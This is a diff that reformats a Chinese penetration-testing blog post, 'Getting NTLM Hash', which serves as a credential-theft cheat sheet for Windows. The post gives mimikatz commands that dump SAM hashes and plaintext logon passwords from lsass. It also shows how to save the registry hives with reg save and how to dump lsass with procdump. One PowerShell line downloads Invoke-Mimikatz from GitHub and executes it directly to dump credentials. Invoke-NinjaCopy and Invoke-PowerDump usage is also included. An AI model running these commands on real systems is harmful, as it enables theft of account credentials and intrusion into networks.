@@ -1,188 +1,31 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>获取 NTLM Hash | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>获取 NTLM Hash</h1>
-      
-<div class="post-meta">
-    <time>2020-12-08</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
-</div>
-
-      <div><h3 id="0x01-通过-sam-文件获取">0x01 通过 sam 文件获取</h3>
-<ul>
-<li>
-<p>通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)</p>
-<pre tabindex="0"><code>mimikatz.exe log &#34;privilege::debug&#34; &#34;token::elevate&#34; &#34;lsadump::sam&#34; exit
-</code></pre></li>
-<li>
-<p>通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)</p>
-<pre tabindex="0"><code>reg save HKLM\SAM sam.hive
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="我的个人博客，主要用于记录自己的一些渗透测试、编程等学习笔记之类的东西。"><meta name=author content="Reber"><title>获取 NTLM Hash | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>获取 NTLM Hash</h1><div class=post-meta><time>2020-12-08</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div><h3 id=0x01-通过-sam-文件获取>0x01 通过 sam 文件获取</h3><ul><li><p>通过 mimikatz 转储 sam 文件得到 hash(cmd 需要管理员权限)</p><pre tabindex=0><code>mimikatz.exe log &#34;privilege::debug&#34; &#34;token::elevate&#34; &#34;lsadump::sam&#34; exit
+</code></pre></li><li><p>通过 reg save 导出 sam 文件(2003 之后可以使用)(导 hiv 文件 cmd 需要管理员权限)</p><pre tabindex=0><code>reg save HKLM\SAM sam.hive
 reg save HKLM\SYSTEM system.hive
 mimikatz.exe &#34;lsadump::sam /sam:sam.hive /system:system.hive&#34; exit
-</code></pre></li>
-<li>
-<p>直接通过 Invoke-NinjaCopy 获取 sam 文件(cmd 需要管理员权限)</p>
-<ul>
-<li>下载 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">NinjaCopy</a> 这个工具拷贝 sam 文件
-<pre tabindex="0"><code>powershell -exec bypass Import-Module .\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive; Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
-</code></pre></li>
-<li>然后执行 mimikatz.exe &ldquo;lsadump::sam /sam:sam.hive /system:system.hive&rdquo; exit 得到 hash</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x02-通过-dmp-文件获取可获取到明文">0x02 通过 dmp 文件获取(可获取到明文)</h3>
-<ul>
-<li>
-<p>通过 lsass 进程的 dmp 文件(procdump64 cmd 需要管理员权限)</p>
-<ul>
-<li>利用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">procdump</a> 得到 dmp 文件: procdump64.exe -accepteula -ma lsass.exe lsass.dmp</li>
-<li>然后执行 mimikatz.exe log &ldquo;sekurlsa::minidump lsass.dmp&rdquo; &ldquo;sekurlsa::logonPasswords full&rdquo; exit 得到密码</li>
-</ul>
-</li>
-<li>
-<p>通过任务管理器 lsass 进程导出 dmp 文件(显示所有进程时需要管理员权限)</p>
-<ul>
-<li>先通过进程转储得到 dmp 文件<br>
-<img src="/img/post/Xnip2022-10-11_11-04-57.png" alt="60"></li>
-<li>然后执行 mimikatz.exe &ldquo;sekurlsa::minidump lsass.dmp&rdquo; &ldquo;sekurlsa::logonPasswords full&rdquo; exit 得到密码</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x03-通过内存获取可获取到明文">0x03 通过内存获取(可获取到明文)</h3>
-<ul>
-<li>
-<p>通过 lsass 进程内存提权(cmd 需要管理员权限)</p>
-<pre tabindex="0"><code>mimikatz.exe log &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34; exit
-</code></pre></li>
-<li>
-<p>powershell 加载 mimikatz 抓取(cmd 需要管理员权限)</p>
-<pre tabindex="0"><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds
-</code></pre><pre tabindex="0"><code>或者先下载然后执行
+</code></pre></li><li><p>直接通过 Invoke-NinjaCopy 获取 sam 文件(cmd 需要管理员权限)</p><ul><li>下载 <a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1>NinjaCopy</a> 这个工具拷贝 sam 文件<pre tabindex=0><code>powershell -exec bypass Import-Module .\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive; Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive
+</code></pre></li><li>然后执行 mimikatz.exe &ldquo;lsadump::sam /sam:sam.hive /system:system.hive&rdquo; exit 得到 hash</li></ul></li></ul><h3 id=0x02-通过-dmp-文件获取可获取到明文>0x02 通过 dmp 文件获取(可获取到明文)</h3><ul><li><p>通过 lsass 进程的 dmp 文件(procdump64 cmd 需要管理员权限)</p><ul><li>利用 <a href=https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump>procdump</a> 得到 dmp 文件: procdump64.exe -accepteula -ma lsass.exe lsass.dmp</li><li>然后执行 mimikatz.exe log &ldquo;sekurlsa::minidump lsass.dmp&rdquo; &ldquo;sekurlsa::logonPasswords full&rdquo; exit 得到密码</li></ul></li><li><p>通过任务管理器 lsass 进程导出 dmp 文件(显示所有进程时需要管理员权限)</p><ul><li>先通过进程转储得到 dmp 文件<br><img src=/img/post/Xnip2022-10-11_11-04-57.png alt=60></li><li>然后执行 mimikatz.exe &ldquo;sekurlsa::minidump lsass.dmp&rdquo; &ldquo;sekurlsa::logonPasswords full&rdquo; exit 得到密码</li></ul></li></ul><h3 id=0x03-通过内存获取可获取到明文>0x03 通过内存获取(可获取到明文)</h3><ul><li><p>通过 lsass 进程内存提权(cmd 需要管理员权限)</p><pre tabindex=0><code>mimikatz.exe log &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34; exit
+</code></pre></li><li><p>powershell 加载 mimikatz 抓取(cmd 需要管理员权限)</p><pre tabindex=0><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCreds
+</code></pre><pre tabindex=0><code>或者先下载然后执行
 powershell Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command &#39;&#34;privilege::debug&#34; &#34;log&#34; &#34;sekurlsa::logonPasswords full&#34;&#39;
-</code></pre></li>
-</ul>
-<h3 id="0x04-其他方式获取">0x04 其他方式获取</h3>
-<ul>
-<li>
-<p>通过 pwdump 获取(cmd 需要管理员权限)</p>
-<ul>
-<li>下载 <a href="https://www.openwall.com/passwords/windows-pwdump">pwdump</a></li>
-<li>下载后执行</li>
-</ul>
-</li>
-<li>
-<p>使用 Invoke-PowerDump 获取(cmd 需要管理员权限)</p>
-<ul>
-<li>下载 <a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1">Invoke-PowerDump</a></li>
-<li>下载后执行
-<pre tabindex="0"><code>powershell Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump
-</code></pre></li>
-</ul>
-</li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre></li></ul><h3 id=0x04-其他方式获取>0x04 其他方式获取</h3><ul><li><p>通过 pwdump 获取(cmd 需要管理员权限)</p><ul><li>下载 <a href=https://www.openwall.com/passwords/windows-pwdump>pwdump</a></li><li>下载后执行</li></ul></li><li><p>使用 Invoke-PowerDump 获取(cmd 需要管理员权限)</p><ul><li>下载 <a href=https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1>Invoke-PowerDump</a></li><li>下载后执行<pre tabindex=0><code>powershell Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump
+</code></pre></li></ul></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
